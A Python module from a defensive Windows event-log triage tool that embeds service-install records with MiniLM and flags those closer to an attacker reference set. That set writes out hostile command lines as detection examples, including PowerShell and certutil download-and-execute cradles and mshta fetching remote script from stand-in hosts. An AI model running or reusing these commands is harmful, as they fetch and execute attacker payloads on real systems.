"""Embedding-based anomaly scoring for service installs (event 7045).

The keyword rules in rules.py only fire when an install path contains a known
bad substring. This module embeds each install with all-MiniLM-L6-v2 (22M
params, run locally through ONNX Runtime via fastembed) and compares it to two
small reference sets: installs that look like ordinary software, and installs
that look like known attacker tradecraft. An install that sits closer to the
attacker set gets flagged, even when no keyword matched.

The reference sets are written out below on purpose, so anyone can read exactly
what the model is being compared against. The test data in
scripts/generate_test_events.ps1 and demo.py is deliberately NOT copied in here.
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from pathlib import Path
from typing import Callable, Sequence

import numpy as np

from .parser import Event

MODEL_NAME = "sentence-transformers/all-MiniLM-L6-v2"
CACHE_DIR = Path.home() / ".cache" / "evtx-triage"

# Each reference list is averaged into one "typical" vector (a centroid). An
# install is flagged when it sits closer to the attacker centroid than to the
# benign one. Averaging is steadier than matching a single nearest example,
# which with only ~20 examples per list mostly matched on surface details.
# Cosine similarity difference, so roughly -1 to +1.
FLAG_MARGIN = 0.0

# (label, service name, image path, account)
BENIGN: list[tuple[str, str, str, str]] = [
    ("Windows shared service host", "wuauserv", r"C:\Windows\system32\svchost.exe -k netsvcs -p", "LocalSystem"),
    ("Windows Update Medic", "WaaSMedicSvc", r"C:\Windows\System32\svchost.exe -k wusvcs -p", "LocalSystem"),
    ("Print Spooler", "Spooler", r"C:\Windows\System32\spoolsv.exe", "LocalSystem"),
    ("Windows Defender engine", "WinDefend", r'"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24090.11-0\MsMpEng.exe"', "LocalSystem"),
    ("Microsoft Edge update", "edgeupdate", r'"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc', "LocalSystem"),
    ("Google update", "gupdate", r'"C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /svc', "LocalSystem"),
    ("Mozilla maintenance", "MozillaMaintenance", r'"C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"', "LocalSystem"),
    ("NVIDIA display container", "NVDisplay.ContainerLocalSystem", r'"C:\Program Files\NVIDIA Corporation\Display.NvContainer\NVDisplay.Container.exe" -s NVDisplay.ContainerLocalSystem', "LocalSystem"),
    ("OneDrive updater", "OneDrive Updater Service", r'"C:\Program Files\Microsoft OneDrive\24.180.0905.0003\OneDriveUpdaterService.exe"', "LocalSystem"),
    ("Steam client service", "Steam Client Service", r'"C:\Program Files (x86)\Common Files\Steam\steamservice.exe" /RunAsService', "LocalSystem"),
    ("VirtualBox guest additions", "VBoxService", r"C:\Windows\System32\VBoxService.exe", "LocalSystem"),
    ("VMware tools", "VMTools", r'"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"', "LocalSystem"),
    ("Sysmon", "Sysmon64", r"C:\Windows\Sysmon64.exe", "LocalSystem"),
    ("Intel graphics", "igccservice", r"C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64\OneApp.IGCC.WinService.exe", "LocalSystem"),
    ("Hardware driver", "e1dexpress", r"\SystemRoot\System32\drivers\e1d68x64.sys", ""),
    ("Adobe updater", "AdobeARMservice", r'"C:\Program Files (x86)\Common Files\Adobe\ARM\1.0\armsvc.exe"', "LocalSystem"),
    ("Zoom sharing service", "ZoomCptService", r'"C:\Program Files\Zoom\bin\CptService.exe" -user_path "C:\Users\pat\AppData\Roaming\Zoom"', "LocalSystem"),
    ("Dell SupportAssist", "SupportAssistAgent", r'"C:\Program Files\Dell\SupportAssistAgent\bin\SupportAssistAgent.exe"', "LocalSystem"),
    ("Windows Search", "WSearch", r"C:\Windows\system32\SearchIndexer.exe /Embedding", "LocalSystem"),
    ("Windows Installer", "msiserver", r"C:\Windows\system32\msiexec.exe /V", "LocalSystem"),
]

SUSPICIOUS: list[tuple[str, str, str, str]] = [
    ("PsExec remote execution", "PSEXESVC", r"%SystemRoot%\PSEXESVC.exe", "LocalSystem"),
    ("Named pipe impersonation (getsystem)", "qhwyzep", r"cmd.exe /c echo qhwyzep > \\.\pipe\qhwyzep", "LocalSystem"),
    ("Encoded PowerShell launcher", "1a7b3cf", r"%COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcA", "LocalSystem"),
    ("Hidden PowerShell download cradle", "WindowsTelemetry", r'powershell.exe -nop -w hidden -c "iwr http://203.0.113.5/a -UseBasicParsing | iex"', "LocalSystem"),
    ("Binary dropped over the ADMIN$ share", "f83a1c2", r"\\127.0.0.1\ADMIN$\f83a1c2.exe", "LocalSystem"),
    ("smbexec-style command service", "BTOBTO", r"%COMSPEC% /Q /c echo cd ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat", "LocalSystem"),
    ("Remote command service (RemCom)", "RemComSvc", r"%SystemRoot%\RemComSvc.exe", "LocalSystem"),
    ("Executable in a public user folder", "SysHelper", r"C:\Users\Public\Libraries\syshelper.exe", "LocalSystem"),
    ("Executable in a user temp folder", "Updater32", r"C:\Users\pat\AppData\Local\Temp\updater32.exe", "LocalSystem"),
    ("rundll32 loading a DLL from ProgramData", "MsCache", r"rundll32.exe C:\ProgramData\mscache.dll,Start", "LocalSystem"),
    ("mshta running remote script", "HelpPane", r"mshta.exe http://198.51.100.7/p.hta", "LocalSystem"),
    ("certutil download", "CertSync", r"cmd /c certutil -urlcache -split -f http://198.51.100.7/x.exe C:\Windows\Temp\x.exe && C:\Windows\Temp\x.exe", "LocalSystem"),
    ("Credential theft driver", "mimidrv", r"C:\Users\Public\mimidrv.sys", ""),
    ("Vulnerable driver dropped in temp", "RTCore64", r"C:\Windows\Temp\RTCore64.sys", ""),
    ("Random-named executable in the Windows folder", "xkvbqtr", r"C:\Windows\xkvbqtr.exe", "LocalSystem"),
]


_WINDOWS_ROOT_BINARY = re.compile(r"(c:\\windows|%systemroot%|\\systemroot)\\[^\\\s]+\.(exe|dll|sys)")


def _looks_random(name: str) -> bool:
    """Short all-lowercase names with almost no vowels, or digits mixed in, like 'cqzlrwm' or 'f83a1c2'."""
    if not name or name != name.lower() or not name.isalnum() or not 5 <= len(name) <= 12:
        return False
    letters = [c for c in name if c.isalpha()]
    vowels = sum(c in "aeiou" for c in letters)
    digits = sum(c.isdigit() for c in name)
    return (letters and vowels / len(letters) < 0.2) or digits >= 2


def context_hints(name: str, path: str) -> list[str]:
    """Plain-English facts about an install path.

    MiniLM was trained on sentences, not Windows paths, so it reads
    'C:\\Windows\\mdsvc32.exe' poorly. Spelling out where the binary lives and
    how it launches gives the model something it can actually compare. These
    are neutral observations, not verdicts: benign Sysmon also sits in the
    Windows folder, and the model weighs that against everything else.
    """
    p = path.lower()
    hints = []
    if "program files" in p:
        hints.append("it is installed under Program Files like normal software")
    elif "\\system32\\" in p or "\\syswow64\\" in p:
        hints.append("it runs from the Windows system folder")
    elif _WINDOWS_ROOT_BINARY.search(p):
        hints.append("the file sits loose in the Windows root folder, where software is rarely installed")
    if "\\users\\" in p:
        hints.append("the file lives inside a user profile folder")
    if "\\temp\\" in p or "%temp%" in p:
        hints.append("it runs from a temporary folder")
    if p.startswith("\\\\") or "admin$" in p or "\\c$" in p:
        hints.append("the file is loaded from a network share")
    if "cmd.exe" in p or "cmd /" in p or "%comspec%" in p:
        hints.append("it is launched through the command shell")
    if "powershell" in p:
        hints.append("it launches PowerShell")
    if "rundll32" in p:
        hints.append("it loads a DLL with rundll32")
    if "http://" in p or "https://" in p:
        hints.append("it downloads something from the internet")
    if "/min" in p or "hidden" in p:
        hints.append("it tries to hide its window")
    if _looks_random(name):
        hints.append("the service name looks randomly generated")
    return hints


def describe(name: str, path: str, account: str = "") -> str:
    """Turn an install into the plain sentence MiniLM actually embeds.

    The raw path is left out on purpose. Testing against the real model showed
    that raw Windows paths drag the embedding toward surface details (quotes,
    path length, version numbers) and cut leave-one-out accuracy from 30/35 to
    21/35. The service name and the plain-English notes carry the meaning.
    """
    hints = context_hints(name, path)
    notes = "; ".join(hints) + "." if hints else "No unusual location or launch method."
    return f"A Windows service named {name}. {notes}"


def describe_event(e: Event) -> str:
    return describe(str(e.get("ServiceName", "")), str(e.get("ImagePath", "")), str(e.get("AccountName", "") or ""))


Embedder = Callable[[Sequence[str]], np.ndarray]


def load_minilm(cache_dir: Path = CACHE_DIR) -> Embedder:
    """Load all-MiniLM-L6-v2 for local ONNX inference.

    The first run downloads about 90 MB of weights into cache_dir. After that it
    runs fully offline. Nothing is ever sent to an inference API.
    """
    from fastembed import TextEmbedding  # optional dependency: pip install -e ".[ml]"

    model = TextEmbedding(MODEL_NAME, cache_dir=str(cache_dir))

    def embed(texts: Sequence[str]) -> np.ndarray:
        return np.asarray(list(model.embed(list(texts))), dtype=np.float32)

    return embed


def _unit(m: np.ndarray) -> np.ndarray:
    return m / np.clip(np.linalg.norm(m, axis=1, keepdims=True), 1e-12, None)


@dataclass
class Score:
    value: float          # similarity to attacker centroid minus similarity to benign centroid
    nearest_bad: str
    nearest_good: str

    @property
    def flagged(self) -> bool:
        return self.value >= FLAG_MARGIN


class ServiceScorer:
    def __init__(self, embed: Embedder):
        self.embed = embed
        self._bad = _unit(embed([describe(*p[1:]) for p in SUSPICIOUS]))
        self._good = _unit(embed([describe(*p[1:]) for p in BENIGN]))
        self._bad_c = _unit(self._bad.mean(axis=0, keepdims=True))[0]
        self._good_c = _unit(self._good.mean(axis=0, keepdims=True))[0]

    def score_texts(self, texts: Sequence[str]) -> list[Score]:
        if not texts:
            return []
        q = _unit(self.embed(texts))
        bad = q @ self._bad.T
        good = q @ self._good.T
        out = []
        for i in range(len(texts)):
            b, g = int(bad[i].argmax()), int(good[i].argmax())
            value = float(q[i] @ self._bad_c - q[i] @ self._good_c)
            # the nearest single example is still reported, to explain the call
            out.append(Score(value, SUSPICIOUS[b][0], BENIGN[g][0]))
        return out

    def score_events(self, events: Sequence[Event]) -> list[Score]:
        return self.score_texts([describe_event(e) for e in events])


def apply(findings: list, scorer: ServiceScorer) -> int:
    """Attach model scores to service_install findings, in place.

    Returns how many installs the model flagged that the rules rated low, which
    is the number the README compares against the rules-only baseline.
    """
    installs = [f for f in findings if f.rule == "service_install" and f.events]
    scores = scorer.score_events([f.events[0] for f in installs])
    missed_by_rules = 0
    for f, s in zip(installs, scores):
        f.anomaly = round(s.value, 3)
        if s.flagged and f.severity == "low":
            f.severity = "medium"
            f.note = f"MiniLM flagged this; closest match: {s.nearest_bad} (keyword rules missed it)"
            missed_by_rules += 1
        elif s.flagged:
            f.note = f"MiniLM agrees; closest match: {s.nearest_bad}"
        elif f.severity == "high":
            f.note = f"MiniLM thinks this looks closer to {s.nearest_good}; worth a second look before escalating"
        else:
            f.note = f"MiniLM: looks like {s.nearest_good}"
    return missed_by_rules


NORMAL_HINTS = ("Program Files", "Windows system folder")


def hints_rule(name: str, path: str) -> bool:
    """Ablation baseline: no model, just 'any note other than a normal location fires'."""
    return any(not any(n in h for n in NORMAL_HINTS) for h in context_hints(name, path))


@dataclass
class EvalResult:
    total: int
    correct: dict[str, int]
    misses: dict[str, list[str]]


def leave_one_out(embed: Embedder) -> EvalResult:
    """Honest accuracy check on the reference examples.

    Each example is hidden in turn, the centroids are rebuilt from what is
    left, and the hidden one is classified, so the model never sees the example
    it is graded on. Three other approaches are scored on the same examples:

    - keyword rules: rules.py as it stood before the model
    - model or rules: what the tool actually does (the model can only add flags)
    - notes as a rule: the plain-English notes with no model, as an ablation,
      to show how much of the result comes from the notes themselves
    """
    from .rules import SUSPICIOUS_PATH_HINTS

    rows = [(r, True) for r in SUSPICIOUS] + [(r, False) for r in BENIGN]
    vecs = _unit(embed([describe(*r[1:]) for r, _ in rows]))
    is_bad = np.array([bad for _, bad in rows])
    idx = np.arange(len(rows))

    names = ["MiniLM", "Keyword rules", "MiniLM or rules", "Notes as a rule (no model)"]
    correct = {n: 0 for n in names}
    misses: dict[str, list[str]] = {n: [] for n in names}
    for i, (row, bad) in enumerate(rows):
        label, name, path, _ = row
        keep = idx != i
        bad_c = _unit(vecs[keep & is_bad].mean(axis=0, keepdims=True))[0]
        good_c = _unit(vecs[keep & ~is_bad].mean(axis=0, keepdims=True))[0]
        model = bool(vecs[i] @ bad_c - vecs[i] @ good_c >= FLAG_MARGIN)
        rules = any(h in path.lower() for h in SUSPICIOUS_PATH_HINTS)
        verdicts = {names[0]: model, names[1]: rules, names[2]: model or rules, names[3]: hints_rule(name, path)}
        for n, v in verdicts.items():
            if v == bad:
                correct[n] += 1
            else:
                misses[n].append(label)
    return EvalResult(len(rows), correct, misses)
